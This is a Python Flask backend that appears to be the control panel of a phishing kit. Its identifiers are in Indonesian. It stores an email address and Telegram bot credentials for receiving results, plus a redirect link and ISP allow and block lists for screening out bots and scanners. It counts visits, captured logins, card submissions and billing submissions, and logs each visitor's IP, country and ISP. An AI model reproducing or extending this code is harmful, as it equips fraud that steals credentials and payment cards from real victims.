from flask import Flask, request, jsonify, send_from_directory
import json
import os
from datetime import datetime

app = Flask(__name__)

# === PENYIMPANAN DATA ===
DATA_FILE = "data_sistem.json"

def muat_data():
    if not os.path.exists(DATA_FILE):
        data_awal = {
            "jml_kunjungan": 0,
            "jml_manusia": 0,
            "jml_bot": 0,
            "jml_login": 0,
            "jml_kartu": 0,
            "jml_tagihan": 0,
            "email_tujuan": "",
            "bot_token": "",
            "chat_id": "",
            "link_pengalihan": "",
            "whitelistISP": "",
            "blacklistISP": "",
            "riwayat": []
        }
        simpan_data(data_awal)
        return data_awal
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def simpan_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

# === HALAMAN STATIS ===
@app.route('/')
def halaman_utama():
    return send_from_directory('.', 'index.html')

@app.route('/<nama>')
def halaman_lain(nama):
    if os.path.exists(nama):
        return send_from_directory('.', nama)
    if nama.startswith('img/'):
        return send_from_directory('img', nama.replace('img/',''))
    return "Halaman tidak ditemukan", 404

# === API PANEL ===
@app.route('/panel_api', methods=['GET', 'POST'])
def panel_api():
    data = muat_data()
    
    if request.method == 'GET':
        return jsonify(data)
    
    aksi = request.json.get('aksi', '')
    
    if aksi == 'simpan_email':
        data['email_tujuan'] = request.json.get('email', '')
        simpan_data(data)
        return jsonify({"ok": True})
    
    elif aksi == 'simpan_telegram':
        data['bot_token'] = request.json.get('bot_token', '')
        data['chat_id'] = request.json.get('chat_id', '')
        simpan_data(data)
        return jsonify({"ok": True})
    
    elif aksi == 'simpan_link':
        data['link_pengalihan'] = request.json.get('link', '')
        simpan_data(data)
        return jsonify({"ok": True})
    
    elif aksi == 'simpan_izin':
        data['whitelistISP'] = request.json.get('daftar', '')
        simpan_data(data)
        return jsonify({"ok": True, "pesan": "Daftar izin tersimpan!"})
    
    elif aksi == 'simpan_blokir':
        data['blacklistISP'] = request.json.get('daftar', '')
        simpan_data(data)
        return jsonify({"ok": True, "pesan": "Daftar blokir tersimpan!"})
    
    elif aksi == 'tambah_kunjungan':
        data['jml_kunjungan'] += 1
        ip = request.json.get('ip', 'Tidak diketahui')
        negara = request.json.get('negara', '-')
        isp = request.json.get('isp', '-')
        status = request.json.get('status', 'BOT')
        alasan = request.json.get('alasan', '')
        
        if status == 'MANUSIA':
            data['jml_manusia'] += 1
        elif status == 'BOT':
            data['jml_bot'] += 1
        elif status == 'LOGIN':
            data['jml_login'] += 1
        elif status == 'KARTU':
            data['jml_kartu'] += 1
        elif status == 'TAGIHAN':
            data['jml_tagihan'] += 1
        
        data['riwayat'].insert(0, {
            "ip": ip,
            "negara": negara,
            "isp": isp,
            "status": status,
            "alasan": alasan,
            "waktu": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        simpan_data(data)
        return jsonify({"ok": True})
    
    elif aksi == 'hapus_semua':
        data['riwayat'] = []
        data['jml_kunjungan'] = data['jml_manusia'] = data['jml_bot'] = 0
        data['jml_login'] = data['jml_kartu'] = data['jml_tagihan'] = 0
        simpan_data(data)
        return jsonify({"ok": True})
    
    return jsonify({"ok": False})

# === JALANKAN SERVER ===
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)